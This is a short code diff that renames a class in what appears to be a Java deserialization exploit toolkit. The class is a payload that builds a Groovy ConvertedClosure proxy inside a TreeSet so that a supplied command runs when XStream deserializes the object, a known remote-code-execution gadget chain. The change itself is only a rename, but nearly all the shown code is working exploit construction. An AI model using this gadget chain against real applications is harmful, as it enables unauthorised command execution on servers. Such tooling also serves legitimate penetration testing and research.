@@ -24,7 +24,7 @@ import java.lang.reflect.Proxy;
 @Authors({ Authors.WH1T3P1G })
 @Dependencies({"Gadget For XStream","org.codehaus.groovy:groovy:2.4.3"})
 @Require(bullets = {"ClosureWithRuntimeBullet"})
-public class GroovyMethodClosure extends Payload<Object> {
+public class GroovyConvertedClosure extends Payload<Object> {
 
     @Override
     public Serializer<?> getSerializer() {
@@ -43,7 +43,7 @@ public class GroovyMethodClosure extends Payload<Object> {
         Object command = bullet.get("command");
         ConvertedClosure handler = new ConvertedClosure((Closure) obj, "compareTo");
         Object map = Proxy.newProxyInstance(
-                GroovyMethodClosure.class.getClassLoader(),
+                GroovyConvertedClosure.class.getClassLoader(),
                 new Class<?>[]{Comparable.class}, handler);
         return PayloadHelper.makeTreeSet(command, map);
     }
